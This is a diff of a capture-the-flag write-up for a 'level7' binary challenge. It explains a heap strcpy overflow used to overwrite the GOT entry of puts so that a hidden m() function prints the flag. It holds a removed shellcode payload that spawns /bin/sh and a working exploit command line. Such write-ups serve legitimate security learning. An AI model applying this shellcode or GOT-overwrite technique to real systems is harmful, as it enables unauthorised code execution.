@@ -1,5 +1,18 @@
+* in this level7 we the program expect two arguments .
+* calls malloc 4 times  (each call it allocate 8 bytes)
+* then the program copy argv[1] to second 8 bytes , that are pointed to by the second block of the first allocation .
+* after that the program copy argv[2] to the forth 8 bytes, that are pointed to by the scond block of the third allocation.
+* then the program open() "/home/user/level8/.pass" and puts its content into buffer .
 
-export  SHELLCODE=$(python -c 'print "\x90"*400 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
+* info functions on gdb shows that theres a function m() which never get called , it prints a global variable c . ( where the flag is stored)
 
+* the program use strcpy to copy the first and second args . 
+* we can use that to copy arbitrary data to memory .
 
-cat | ./level7 $(python -c 'print "AAAABBBBCCCCDDDDEEEE" + "\x08\x04\x99\x34"[::-1]') $(python -c 'print "\xbf\xff\xf8\x30"[::-1]')
+* more precisly we can overwrite the GOT of puts with the address of m() ()
+
+* running the line bellow do exactly that .
+
+address of m (where to redirect code) : 0x080484f4
+got of puts (What to write): 0x8049928 
+./level7 $(python -c 'print "AAAABBBBCCCCDDDDEEEE" + "\x08\x04\x99\x28"[::-1]') $(python -c 'print "\x08\x04\x84\xf4"[::-1]')
